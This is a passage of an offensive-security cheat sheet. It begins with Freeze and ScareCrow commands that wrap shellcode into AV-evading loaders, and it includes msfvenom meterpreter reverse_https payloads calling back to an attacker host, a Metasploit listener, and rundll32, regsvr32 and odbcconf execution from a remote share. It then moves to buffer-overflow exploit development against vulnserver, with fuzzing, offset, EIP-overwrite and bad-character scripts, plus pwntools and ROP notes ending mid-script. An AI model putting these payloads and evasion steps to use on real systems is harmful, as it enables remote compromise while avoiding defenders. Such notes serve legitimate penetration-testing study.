```c
$ go get golang.org/x/sys/windows
```

### Common Commands

```c
$ ./Freeze -I <FILE>.bin -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -O <FILE>.exe
$ ./Freeze -I <FILE>.bin -encrypt -sandbox -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -encrypt -sandbox -O <FILE>.exe
$ ./Freeze -I <FILE>.bin -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
```

## ScareCrow

> https://github.com/Tylous/ScareCrow

### Payloads

#### Shellcode Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
```

#### .msi-File Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
```

#### Listener

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
```

### Obfuscation

#### Shellcode

```c
$ ScareCrow -I <FILE>.bin -Loader binary -domain <FAKE_DOMAIN>
```

#### DLL Side-Loading

```c
$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
```
#### Windows Script Host

```c
$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
```

#### Control Panel Files

```c
$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
```

#### Process Injection

```c
$ ScareCrow -I <FILE>.bin -injection "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" -domain <FAKE_DOMAIN>
```

### Renaming Payload

```c
$ mv <FILE>.dll <FILE>32.dll
```

### Execution

```c
PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
```

or

```c
PS C:\> regsvr32 /s .\<FILE>32.dll
```

For `.cpl-Files` a simple double click is enough to execute them.

### Evasion focused Execution

```c
PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
```





# Exploitation

- [Resources](#resources)

## Table of Contents

- [ASLR](#aslr)
- [Buffer Overflow](#buffer-overflow)
- [checksec](#checksec)
- [gcc](#gcc)
- [General-Purpose Registers](#general-purpose-registers)
- [libc](#libc)
- [Metasploit](#metasploit)
- [mingw](#mingw)
- [mona](#mona)
- [NASM](#nasm)
- [objdmp](#objdump)
- [Offsets](#offsets)
- [Python](#python)
- [Pwntools](#pwntools)
- [readelf](#readelf)
- [ROPgadget](#ropgadget)
- [Ropper](#ropper)
- [ROP x86_64](#rop-x86_64)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Buffer Overflow | Buffer Overflow Course | https://github.com/gh0x0st/Buffer_Overflow |
| checksec | Checksec is a bash script to check the properties of executables (like PIE, RELRO, Canaries, ASLR, Fortify Source). | https://github.com/slimm609/checksec.sh |
| how2heap | A repository for learning various heap exploitation techniques. | https://github.com/shellphish/how2heap |
| mona | Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform). | https://github.com/corelan/mona |
| PwnTools | CTF framework and exploit development library | https://github.com/Gallopsled/pwntools |
| Ropper | Display information about files in different file formats and find gadgets to build rop chains for different architectures (x86/x86_64, ARM/ARM64, MIPS, PowerPC, SPARC64). For disassembly ropper uses the awesome Capstone Framework. | https://github.com/sashs/Ropper |

## ASLR

### Check status

```c
$ cat /proc/sys/kernel/randomize_va_space
```

### Test Binary

```c
$ ./<BINARY> `python -c 'print "A"*200'`    // segmentation fault (core dumped) should be the output
```

### Testing ASLR

#### Execute it several times

```c
$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7571000)
```

##### Example

```c
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d5e000)
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7cf9000)
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7cf6000)
```

#### Disable ASLR

```c
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

##### Example

```c
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dca000)
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dca000)
$ ldd ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dca000)
```

#### Enable ASLR

```c
$ echo 2 > /proc/sys/kernel/randomize_va_space
```

## Buffer Overflow

### Checking if there's Overflow Protection

```c
$ cat /proc/sys/kernel/randomize_va_space
$ ldd /usr/local/bin/ovrflw | grep libc
```

### Overview

```c
Kernel      Top         0xffff
Stack                               is going down
Heap                                is going up
Data
Text        Button      0000
```

### Stack

```c
ESP (Extended Stack Pointer)                            Top
Buffer Space
EBP (Extended Base Pointer)                             Base (B for Base)
EIP (Extended Instruction Pointer) / Return Address
```

- ESP is the TOP
- EBP is the BOTTOM
- EIP is the POINTER

Buffer space goes down. If there an input validation is wrong the `EBP` and `EIP` can be reached fill the buffer space up with `x41 (A) x42 (B)`.

### Build

#### fuzzer.py

```c
#!/user/bin/python3
import socket

vulnserverHost = "<RHOST>"
vulserverDefaultPort = <RPORT>
buffer = ["A"]
counter = 100
while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter = counter + 200

for string in buffer:
    print("Fuzzing vulnserver with bytes: " + str(len(string)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((vulnserverHost, vulserverDefaultPort))
    s.send(('TRUN /.:/' + string).encode())
    s.close()
```

### Create Pattern Script

```c
#!/user/bin/python3
import socket

vulnserverHost = "<RHOST>"
vulserverDefaultPort = <RPORT>

shellcode = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2Gr3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2Gz3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6Hf7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2Hh3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((vulnserverHost, vulserverDefaultPort))
    s.send(('TRUN /.:/' + shellcode).encode())
except:
    print("check debugger")
finally:
    s.close()
```

### Find the Offset

```c
EIP 386F4337
```

### Put that into the Offset

```c
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5900 -q 386F4337
l - length
q - EIP value
```

That gives an exact match at offset `2003 bytes`.

### Overwriting the EIP

#### Try to overwrite the EIP with 4xB (0x42) controlled

```c
#!/user/bin/python3
import socket

vulnserverHost = "<RHOST>"
vulnserverDefaultPort = <RPORT>

shellcode = "A" * 2003 + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((vulnserverHost, vulnserverDefaultPort))
    s.send(('TRUN /.:/' + shellcode).encode())
except:
    print("check debugger")
finally:
    s.close()
```

Immunity Debugger should point `42424242` for EIP.

### Finding Bad Characters

#### NULL Byte is always bad

> https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

Remove the `\x00` from the list as it is the `NULL Byte`.

### Add the Bad Characters to the Shellcode

#### exploit.py

```c
#!/user/bin/python3
import socket

vulnserverHost = "<RHOST>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
    connect = s.connect((vulnserverHost, <RPORT>))
    s.send(('TRUN /.:/' + shellcode).encode())
except:
    print("check debugger")

s.close()
```

## checksec

```c
$ checksec <FILE>
```

### Options

| Option | Description |
| --- | --- |
| RELRO (Relocation Read-Only) | |
| Partial RELRO | It is possible to read/write the global offset table. |
| Full RELRO | Only the global offset table is readable. It is not possible to overwrite GOT. |
| STACK CANARY | |
| No canary found | The application is vulnerable to buffer overflow. |
| NX (Non-eXecutable segments) | |
| NX enabled | No execution of custom shellcode from the stack possible. |
| PIE (Position Independent Executable) | |
| No PIE | The binary always starts at same address. |

## gcc

```c
$ gcc -o <FILE> <FILE>.c
```

## General-Purpose Registers

> https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start

The 64-bit versions of the 'original' x86 registers are named:

```c
rax - register a extended
rbx - register b extended
rcx - register c extended
rdx - register d extended
rbp - register base pointer (start of stack)
rsp - register stack pointer (current location in stack, growing downwards)
rsi - register source index (source for data copies)
rdi - register destination index (destination for data copies)
```

The registers added for 64-bit mode are named:

```c
r8 - register 8
r9 - register 9
r10 - register 10
r11 - register 11
r12 - register 12
r13 - register 13
r14 - register 14
r15 - register 15
```

## libc

### Find libc Location

```c
$ ldd `which netstat`
$ cat `gcc -print-file-name=libc.so`
```

## Metasploit

### Pattern Location

```c
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h
```

### Create Unique String

```c
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

### Query Offset

```c
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 64413764
```

## mingw

```c
$ sudo apt install mingw-w64
```

```c
$ i686-w64-mingw32-gcc -o main32.exe main.c
$ x86_64-w64-mingw32-gcc -o main64.exe main.c
```

## mona

### Create Pattern

```c
!mona pattern_create 1500
```

#### Pattern Directory
 
```c
`C:\Users\<USERNAME>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\pattern.txt`
```

### Find a specific Offset

```c
!mona pattern_offset 33694232
```

### Create Bad Characters

```c
!mona bytearray
```

### Use Bad Characters

```c
!mona compare -f </PATH/TO/BYTEARRAY/<FILE>.txt> -a <START_ADDRESS_BAD_CHARACTERS>
```

### Compare Bad Characters

```c
!mona compare -f bytearray.txt -a 0019FD54
```

## NASM

```c
$ nasm -f elf32 -l exploit exploit.asm
```

## objdmp

### Disassemble a Binary

```c
$ objdmp -D <BINARY>
```

### Finding syscall

```c
$ objdmp -D <BINARY> | grep system
```

### Getting Shellcode

```c
$ objdump -d ./exploit.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

## Offsets

### Sending Pattern to find offset to local listener

```c
$ gdb --args ./<BINARY> <LPORT>
```

### send_pattern.py

```c
from pwn import *

io = remote('127.0.0.1', <LPORT>)

offset = 800                       # Start with a Number of 800
size = p32(offset, endian='big')   # 32-bit Big Endian

payload = [
    size,
    cyclic(1000)                    # Create a 1000 Characters Pattern
]

payload = b"".join(payload)

io.send(payload)
io.interactive()
```

### Finding rps in gdb

```c
gef> x/wx $rsp
0x7fffffffde18: 0x66616166
```

### Decoding to get the Offset

```c
$ python -c 'from pwn import *; print(cyclic_find(unhex("66616166")[::-1]))'
```

## Python

### Characters

```c
$ python -c "print('a' * 50)"
$ python3 -c 'print("A"*18+"B"*8+"C"*18)'
```

### Length

```c
$ python
>>> len("\x31\xd2\x31\xc0\x83\xec\x16\xff\xe4")
9
```

## Pwntools

> https://github.com/Gallopsled/pwntools

### LD_PRELOAD

```c
libc = ELF(<NAME>)
main = ELF(<NAME>)
r = main.process(env={'LD_PRELOAD' : libc.path})
```

### Value Extraction

```c
get = lambda x: [sh.recvuntil('{} : '.format(x)), int(sh.recvline())][1]
p = get('p')
```

### Create Payload for Buffer Overflow

```c
$ python -c "import pwn; print('a' * 60 + pwn.p64(0x1337bab3))"
```

### Execute Program via SSH

```c
#!/usr/bin/python
from pwn import *

s = ssh(host='', user='', password='')
p = s.run('cd /PATH/TO/FILE && ./<FILE>')
p.recv()
p.sendline(<PAYLOAD>)
p.interactive()
s.close()
```

## readelf

```c
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

## ROPgadget

### Search ROP Gadgets

```c
$ ROPgadget --binary <BINARY>
```

## Ropper

> https://github.com/sashs/Ropper

### Basic Usage

```c
(ropper)> file <FILE>
(<FILE>/ELF/x86)> search /1/  jmp esp
```

### Search ROP Gadgets

```c
$ ropper -f libc-2.31.so --search "rop rdi"
$ ropper -f libc-2.31.so --search "rop rsi"
$ ropper -f libc-2.31.so --search "rop rdx"
$ ropper -f libc-2.31.so --search "jmp rsp"
```

## ROP x86_64

> https://masterccc.github.io/memo/rop_example/

* Local
* gets()
* x86_x64
* No setuid()
* No canary

### Source Code

```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);
    return 0;
}
```

### Compilation

```c
$ gcc -o <FILE> <FILE>.c -fno-stack-protector  -no-pie
```

```c
$ file <FILE>
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20e082fc91a594a5d0a331e84688a0d62b3b7b56, not stripped
```

### ROP Script

```c
# coding: utf-8
from pwn import *

# choose and run
